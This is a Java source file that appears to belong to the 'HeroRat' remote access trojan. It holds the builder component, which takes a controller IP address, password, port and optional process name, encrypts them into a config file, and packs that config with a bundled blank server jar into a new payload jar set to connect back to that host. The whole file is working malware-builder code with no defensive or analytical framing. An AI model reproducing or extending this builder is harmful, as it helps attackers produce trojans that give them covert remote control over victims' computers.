package net.herorat.features.create;

import java.io.FileOutputStream;
import java.util.Date;
import java.util.jar.JarEntry;
import java.util.jar.JarInputStream;
import java.util.jar.JarOutputStream;
import java.util.jar.Manifest;

import javax.swing.JOptionPane;

import net.herorat.Main;
import net.herorat.utils.Crypto;


public class Create
{
	public static void create(String ip, String password, int port, String path, String process)
	{
		if (path.equals(""))
		{
			path = "Server_" + new Date().getTime() + ".jar";
		}
		else if (!path.endsWith(".jar"))
		{
			if (path.lastIndexOf(".") > 0)
			{
				path = path.substring(0, path.lastIndexOf(".")) + ".jar";
			}
			else
			{
				path += ".jar";
			}
		}
		
		StringBuffer buffer = new StringBuffer();
		
		buffer.append(ip);
		buffer.append("###");
		buffer.append(password);
		buffer.append("###");
		buffer.append(String.valueOf(port));
		
		if (!process.equals(""))
		{
			buffer.append("###");
			buffer.append(process);
		}
		
		try
		{
			JarInputStream input = new JarInputStream(Create.class.getClassLoader().getResourceAsStream("/lib/blank_server.jar"));
			Manifest mf = new Manifest();
			mf.read(Create.class.getClassLoader().getResourceAsStream("/lib/blank_manifest.mf"));
			JarOutputStream output = new JarOutputStream(new FileOutputStream(path), mf);

			output.putNextEntry(new JarEntry("config.cfg"));
			output.write( Crypto.byteToHex(Crypto.crypt(buffer.toString())).getBytes() );
			output.closeEntry();

			byte[] content_buffer = new byte[1024];
			JarEntry entry;
			while ((entry = input.getNextJarEntry()) != null)
			{
				if (!"META-INF/MANIFEST.MF".equals(entry.getName()))
				{
					output.putNextEntry(entry);
					int length;
					while ((length = input.read(content_buffer)) != -1)
					{
						output.write(content_buffer, 0, length);
					}

					output.closeEntry();
				}
			}

			output.flush();
			output.close();
			input.close();

			JOptionPane.showMessageDialog(Main.mainWindow.panel_tab1, "Server was successfully created");
		}
		catch (Exception e)
		{
			e.printStackTrace();
		}
	}
}